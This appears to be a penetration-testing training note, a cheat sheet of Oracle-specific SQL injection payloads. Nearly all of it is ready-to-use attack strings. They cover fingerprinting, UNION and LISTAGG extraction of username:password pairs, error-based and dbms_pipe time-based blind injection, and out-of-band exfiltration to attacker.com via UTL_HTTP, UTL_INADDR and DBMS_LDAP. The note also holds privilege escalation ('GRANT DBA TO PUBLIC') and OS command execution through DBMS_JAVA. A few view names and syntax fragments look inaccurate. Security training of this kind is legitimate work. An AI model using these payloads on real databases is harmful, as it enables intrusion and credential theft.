---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.18 Oracle Specific Payloads"
---

# 06.18 — Oracle Specific Payloads

## Oracle Detection

```sql
-- ORACLE REQUIRES "FROM dual" FOR SELECTS WITHOUT TABLE:
SELECT 1             → ERROR in Oracle!
SELECT 1 FROM dual   → Works (dual is Oracle's dummy table)

-- DETECTION PAYLOADS:
' AND 1=1--                    → might not work (Oracle uses -- comments)
' AND 1=1 FROM dual--          → Oracle syntax hint
' UNION SELECT NULL FROM dual-- → works in Oracle

-- ORACLE VERSION:
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT version FROM v$instance

-- DETECT VIA TIMING:
' AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',5)=1)--
-- 5 second delay = Oracle!

-- ORACLE COMMENT STYLE:
-- (double dash, same as standard SQL)
/* multi-line comment */
```

---

## Oracle Information Extraction

```sql
-- CURRENT USER:
SELECT user FROM dual
SELECT sys_context('USERENV','SESSION_USER') FROM dual

-- CURRENT DATABASE (Oracle uses SID not database):
SELECT sys_context('USERENV','DB_NAME') FROM dual
SELECT name FROM v$database

-- ALL SCHEMAS (databases in Oracle):
SELECT username FROM all_users
SELECT owner FROM all_tables GROUP BY owner

-- ALL TABLES (in all accessible schemas):
SELECT table_name, owner FROM all_tables

-- TABLES IN CURRENT USER'S SCHEMA:
SELECT table_name FROM user_tables

-- COLUMNS IN TABLE:
SELECT column_name, data_type FROM all_columns WHERE table_name='USERS'
SELECT column_name FROM user_tab_columns WHERE table_name='USERS'

-- NOTE: Oracle table/column names are UPPERCASE by default!
-- 'users' → 'USERS', 'username' → 'USERNAME'

-- ALL ORACLE BUILT-IN VIEWS FOR RECON:
-- all_tables, all_columns, all_views, all_procedures
-- user_tables (current schema), dba_tables (requires DBA privs)

-- VERSION:
SELECT banner FROM v$version WHERE ROWNUM=1
-- → "Oracle Database 19c Enterprise Edition Release 19.0.0.0.0"
```

---

## Oracle Data Extraction

```sql
-- CONCAT (Oracle uses ||):
SELECT username || ':' || password FROM users WHERE ROWNUM=1

-- ALL ROWS AS SINGLE STRING:
SELECT LISTAGG(username || ':' || password, ',') WITHIN GROUP (ORDER BY 1) FROM users
-- LISTAGG = Oracle's GROUP_CONCAT

-- WM_CONCAT (older Oracle):
SELECT WM_CONCAT(username || ':' || password) FROM users

-- XMLAGG (alternative):
SELECT RTRIM(XMLAGG(XMLELEMENT(e,username || ':' || password || ',')).EXTRACT('//text()').GETCLOBVAL(),',') FROM users

-- PAGINATION (ROWNUM):
SELECT username FROM users WHERE ROWNUM=1         -- first row
SELECT username FROM (SELECT username, ROWNUM rn FROM users) WHERE rn=2  -- second row
SELECT username FROM (SELECT username, ROWNUM rn FROM users) WHERE rn BETWEEN 1 AND 5

-- 12c+ (OFFSET/FETCH):
SELECT username FROM users ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
```

---

## Oracle UNION-Based

```sql
-- ORACLE UNION REQUIRES FROM dual:
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,NULL,NULL FROM dual--

-- WITH DATA:
' UNION SELECT username,password FROM users WHERE ROWNUM=1--
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--

-- MULTI-ROW (one way per query):
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY 1),NULL FROM users--
```

---

## Oracle Error-Based

```sql
-- TO_NUMBER() cast error:
' AND 1=TO_NUMBER((SELECT username FROM users WHERE ROWNUM=1))--
-- Error: "ORA-01722: invalid number" ... "admin" might appear!

-- Note: Oracle error messages are less verbose than MySQL/MSSQL
-- The data is often in the error but might need a different approach

-- UTL_INADDR (DNS-based error):
' AND 1=UTL_INADDR.GET_HOST_ADDRESS(username||(SELECT username FROM users WHERE ROWNUM=1)||'.attacker.com')--
-- Triggers DNS lookup with data in the query!

-- CTXSYS.DRITHSX.SN (error with data):
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT username FROM users WHERE ROWNUM=1))--
-- Error includes the queried value

-- XMLType:
' AND 1=XMLType('<x>'||(SELECT username FROM users WHERE ROWNUM=1)||'</x>')--
-- Sometimes returns data in XML parse error
```

---

## Oracle Time-Based

```sql
-- dbms_pipe.receive_message (most reliable):
' AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',5)=1)--
-- 5 second delay (returns 1 = success after timeout)

-- CONDITIONAL TIME:
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)--
-- 5 second delay for TRUE conditions

-- EXTRACT DATA VIA TIMING:
' AND 1=(SELECT CASE WHEN (SUBSTR(user,1,1)='S') THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)--
-- delay = first char of user is 'S'!

-- WAIT_FUNCTION (Oracle 10g+):
' AND 1=(SELECT 1 FROM dual WHERE (SELECT COUNT(*) FROM all_users WHERE username='SYS')=dbms_pipe.receive_message('test',5))--

-- HEAVY QUERY (CPU-based delay):
' AND 1=(SELECT COUNT(*) FROM all_objects,all_objects,all_objects)--
-- Self-join causes high CPU = delay
```

---

## Oracle Out-of-Band

```sql
-- UTL_HTTP (HTTP request from DB):
' AND UTL_HTTP.REQUEST('http://attacker.com/?data='||user) IS NOT NULL FROM dual--

-- UTL_HTTP WITH DATA:
' AND UTL_HTTP.REQUEST('http://attacker.com/?db='||(SELECT username FROM users WHERE ROWNUM=1)) IS NOT NULL FROM dual--

-- UTL_INADDR (DNS lookup):
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM users WHERE ROWNUM=1)||'.attacker.com') IS NOT NULL FROM dual--
-- → DNS query: admin.attacker.com → captured!

-- DBMS_LDAP (LDAP = DNS):
' AND DBMS_LDAP.INIT((SELECT username FROM users WHERE ROWNUM=1)||'.attacker.com',389) IS NOT NULL FROM dual--

-- UTL_FILE (file write — requires directory object):
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('DIRECTORY_OBJECT', 'output.txt', 'W');
  UTL_FILE.PUT_LINE(f, (SELECT username FROM users WHERE ROWNUM=1));
  UTL_FILE.FCLOSE(f);
END;/
```

---

## Oracle Privilege Escalation

```sql
-- CHECK DBA PRIVILEGES:
SELECT * FROM session_privs                     -- current session privileges
SELECT * FROM dba_sys_privs WHERE grantee=user  -- requires DBA!
SELECT * FROM user_sys_privs                    -- current user's system privs

-- CHECK IF DBA:
SELECT sys_context('USERENV','IS_DBA') FROM dual
-- → 'TRUE' or 'FALSE'

-- EXECUTE AS SYS (if EXECUTE on DBMS_UTILITY):
EXECUTE DBMS_UTILITY.EXEC_DDL_STATEMENT('GRANT DBA TO PUBLIC');

-- ORACLE JAVA (if Java stored procedures enabled):
-- Can execute OS commands via Java!
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper echo test') FROM dual;

-- CHECK JAVA STATUS:
SELECT VALUE FROM v$option WHERE PARAMETER='Java';
```

---

## Oracle Stacked Queries

**Oracle does NOT support `;` stacked queries in most drivers!**

```
ORACLE STACKED QUERY SUPPORT:
  SQL*Plus: yes (interactive tool)
  JDBC: NO by default
  PHP OCI8: NO
  Python cx_Oracle: NO (by default)
  ADO.NET: NO

WORKAROUNDS:
  → Use PL/SQL anonymous blocks when possible:
  '; BEGIN DBMS_OUTPUT.PUT_LINE(1); END; --
  → Most attacks via WHERE clauses (no stacking needed)
  → OOB via UTL_HTTP/UTL_INADDR works without stacking!
```

---

## Oracle UNION Cheat Sheet

```sql
-- COUNT COLUMNS (ORDER BY):
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  → error = 2 columns!

-- UNION WITH CORRECT COLUMN COUNT:
' UNION SELECT NULL,NULL FROM dual--  → 2 columns, now find visible one

-- FIND VISIBLE COLUMN:
' UNION SELECT 'visA','visB' FROM dual--

-- EXTRACT VERSION:
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--

-- EXTRACT USERS:
' UNION SELECT username||':'||password,NULL FROM users WHERE ROWNUM=1--

-- EXTRACT ALL:
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY 1),NULL FROM users--
```

---

## Oracle Cheat Sheet Summary

```
DETECTION:   FROM dual, dbms_pipe.receive_message, TO_NUMBER errors
DATABASES:   SELECT username FROM all_users (= schemas)
TABLES:      SELECT table_name FROM all_tables WHERE owner='MYAPP'
COLUMNS:     SELECT column_name FROM all_columns WHERE table_name='USERS'
DATA:        SELECT username||':'||password FROM users WHERE ROWNUM=1
AGGREGATION: LISTAGG(col,',') WITHIN GROUP (ORDER BY 1)
UNION:       SELECT NULL FROM dual (FROM dual required!)
TIME:        dbms_pipe.receive_message('a',5) / CASE WHEN...
ERROR:       TO_NUMBER(data)
OOB:         UTL_HTTP.REQUEST / UTL_INADDR.GET_HOST_ADDRESS
TABLE NAMES: UPPERCASE by default!
```

---

## Related Notes
- [[15 - MySQL Specific Payloads]] — MySQL comparison
- [[16 - PostgreSQL Specific Payloads]] — PostgreSQL comparison
- [[17 - MSSQL Specific Payloads]] — MSSQL comparison
- [[07 - Out-of-Band SQLi]] — OOB techniques
